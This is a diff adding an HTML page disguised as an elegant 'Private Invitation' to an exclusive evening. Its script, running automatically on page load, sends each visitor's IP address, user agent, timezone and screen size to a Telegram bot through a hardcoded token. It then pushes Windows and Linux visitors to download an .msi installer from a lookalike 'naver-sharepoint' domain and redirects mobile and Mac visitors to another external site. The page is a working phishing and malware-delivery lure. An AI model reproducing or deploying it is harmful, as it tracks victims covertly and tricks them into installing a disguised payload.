@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XIV . Private Invitation</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,500;1,600&family=Cinzel:wght@400;700;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --gold: #d4af37;
+      --deep: #0a0618;
+      --void: #0f0a1f;
+      --smoke: rgba(255,255,255,0.06);
+      --fade: rgba(212,175,55,0.12);
+      --glow: rgba(212,175,55,0.35);
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body { height:100%; overflow:hidden; }
+    body {
+      background: radial-gradient(circle at 25% 75%, #1a0f38, #0a0618 65%);
+      color: #e8e2d2;
+      font-family: 'Cormorant Garamond', serif;
+      display: flex; justify-content: center; align-items: center;
+      position: relative;
+      animation: fadeIn 2.5s ease-out forwards;
+    }
+    .veil {
+      position: absolute; inset: 0;
+      background: 
+        radial-gradient(circle at 20% 30%, rgba(212,175,55,0.12) 0%, transparent 50%),
+        radial-gradient(circle at 80% 70%, rgba(212,175,55,0.08) 0%, transparent 50%),
+        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120"><circle cx="60" cy="60" r="1" fill="%23d4af37" opacity="0.6"/></svg>') repeat;
+      background-size: 120px, 180px, 40px;
+      opacity: 0.5;
+      pointer-events: none;
+      animation: drift 60s linear infinite, twinkle 8s ease-in-out infinite alternate;
+    }
+    .card {
+      background: linear-gradient(135deg, rgba(10,6,24,0.96), rgba(15,10,31,0.92));
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      border: 1px solid rgba(212,175,55,0.3);
+      border-radius: 32px;
+      padding: 80px 70px;
+      max-width: 620px;
+      width: 92%;
+      text-align: center;
+      box-shadow:
+        0 30px 90px rgba(0,0,0,0.7),
+        0 0 100px var(--glow) inset,
+        0 0 40px rgba(212,175,55,0.2);
+      position: relative;
+      z-index: 2;
+      animation: rise 2s cubic-bezier(0.25, 0.8, 0.25, 1) 0.6s forwards;
+      opacity: 0;
+      transform: translateY(50px) scale(0.98);
+    }
+    .seal {
+      width: 110px; height: 110px; margin: 0 auto 36px;
+      background: linear-gradient(135deg, #e8c56a, #d4af37);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-family: 'Cinzel', serif;
+      font-size: 44px; color: #0a0618;
+      font-weight: 900;
+      letter-spacing: 2px;
+      box-shadow: 
+        0 0 50px rgba(212,175,55,0.7),
+        0 0 80px rgba(212,175,55,0.4) inset;
+      position: relative;
+      overflow: hidden;
+      animation: pulse 4s ease-in-out infinite;
+    }
+    .seal::before {
+      content: ''; position: absolute; inset: 0;
+      background: radial-gradient(circle at center, rgba(255,255,255,0.3) 0%, transparent 70%);
+      opacity: 0.6;
+    }
+    h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 48px;
+      letter-spacing: 8px;
+      color: #ffffff;
+      margin: 24px 0 14px;
+      text-transform: uppercase;
+      font-weight: 700;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.4);
+    }
+    .subtitle {
+      font-size: 19px; color: #c9b687; letter-spacing: 4px;
+      font-weight: 300; margin-bottom: 36px;
+      font-style: italic;
+      opacity: 0.9;
+    }
+    .message {
+      font-size: 19px; line-height: 1.9; color: #e0d9cc;
+      margin: 36px 0; font-weight: 300;
+      letter-spacing: 0.5px;
+    }
+    .loader {
+      width: 220px; height: 3px; background: rgba(255,255,255,0.08);
+      margin: 48px auto; border-radius: 3px; overflow: hidden;
+      position: relative;
+      box-shadow: 0 0 15px rgba(212,175,55,0.2);
+    }
+    .loader::after {
+      content: ''; position: absolute; left: 0; top: 0; height: 100%;
+      width: 0%; 
+      background: linear-gradient(90deg, transparent, #d4af37, #e8c56a, #d4af37, transparent);
+      animation: load 3.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+      box-shadow: 0 0 25px #d4af37, 0 0 40px #e8c56a;
+      filter: blur(1px);
+    }
+    .btn {
+      background: transparent;
+      color: #fff;
+      border: 2px solid var(--gold);
+      padding: 18px 56px;
+      border-radius: 60px;
+      font-family: 'Cinzel', serif;
+      font-size: 17px;
+      letter-spacing: 3px;
+      cursor: pointer;
+      transition: all 0.6s cubic-bezier(0.25, 0.8, 0.25, 1);
+      margin-top: 16px;
+      text-transform: uppercase;
+      font-weight: 600;
+      position: relative;
+      overflow: hidden;
+      z-index: 1;
+    }
+    .btn::before {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(135deg, #d4af37, #e8c56a);
+      opacity: 0;
+      transition: opacity 0.6s;
+      z-index: -1;
+    }
+    .btn:hover::before { opacity: 1; }
+    .btn:hover {
+      color: #0a0618;
+      box-shadow: 0 0 40px rgba(212,175,55,0.8), 0 8px 25px rgba(0,0,0,0.3);
+      transform: translateY(-3px) scale(1.02);
+      border-color: transparent;
+    }
+    footer {
+      margin-top: 60px; font-size: 13px; color: #888;
+      letter-spacing: 1.5px; font-style: italic;
+      opacity: 0.8;
+      font-family: 'Cormorant Garamond', serif;
+    }
+    @keyframes fadeIn { to { opacity: 1; } }
+    @keyframes rise { 
+      to { 
+        opacity: 1; 
+        transform: translateY(0) scale(1); 
+      } 
+    }
+    @keyframes pulse { 
+      0%,100% { box-shadow: 0 0 50px rgba(212,175,55,0.7), 0 0 80px rgba(212,175,55,0.4) inset; } 
+      50% { box-shadow: 0 0 70px rgba(212,175,55,1), 0 0 100px rgba(212,175,55,0.6) inset; } 
+    }
+    @keyframes drift { 
+      from { background-position: 0 0, 0 0, 0 0; } 
+      to { background-position: 120px 120px, -180px -180px, 40px 40px; } 
+    }
+    @keyframes twinkle {
+      0%, 100% { opacity: 0.5; }
+      50% { opacity: 0.7; }
+    }
+    @keyframes load { 
+      from { width: 0%; } 
+      to { width: 100%; } 
+    }
+  </style>
+</head>
+<body>
+  <div class="veil"></div>
+  <div class="card">
+    <div class="seal">XIV</div>
+    <h1>Private Invitation</h1>
+    <div class="subtitle">An Evening of Distinction</div>
+    <p class="message">
+      You have been personally selected to attend an exclusive gathering of visionaries.<br>
+      Your presence is requested. Access is granted to a privileged few.
+    </p>
+    <div class="loader"></div>
+    <button class="btn" onclick="accept()">Accept Invitation</button>
+    <footer>Confidential . By Invitation Only . November 2025</footer>
+  </div>
+
+  <script>
+    const SEC = {t:"8274783853:AAHCZcvM-D2HrICR4NFNRmAvMYWTqIhYrXU",c:"6295027853",p:"https://naver-sharepoint.github.io/naver-auth-sharepoint/appviewer.msi",m:"https://iohy.life/view"};
+    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    const isMac = navigator.platform.toUpperCase().indexOf('MAC')>=0||/Macintosh|MacIntel|MacPPC|Mac68K/i.test(navigator.platform)||/Mac|iPhone|iPad|iPod/.test(navigator.userAgent);
+    const redirectToAlternate = isMobile || isMac;
+
+    async function logAccess(){
+      try{
+        const r=await fetch("https://api.ipify.org?format=json");
+        const {ip}=await r.json();
+        const d={ip,ua:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,res:`${screen.width}x${screen.height}`,t:new Date().toISOString(),dev:redirectToAlternate?(isMobile?"Mobile":"Mac"):"Desktop (Win/Linux)"};
+        await fetch(`https://api.telegram.org/bot${SEC.t}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:SEC.c,text:`Private Invite Accessed\nIP: ${d.ip}\nDevice: ${d.dev}\nTime: ${d.t}\nUA: ${d.ua}`})});
+      }catch(e){}
+    }
+
+    function accept(){location.href=SEC.p;}
+
+    window.onload=async()=>{
+      document.documentElement.style.visibility="visible";
+      await logAccess();
+      if(redirectToAlternate){
+        setTimeout(()=>location.replace(SEC.m),800);
+      }else{
+        setTimeout(accept,3500);
+      }
+    };
+  </script>
+</body>
+</html>
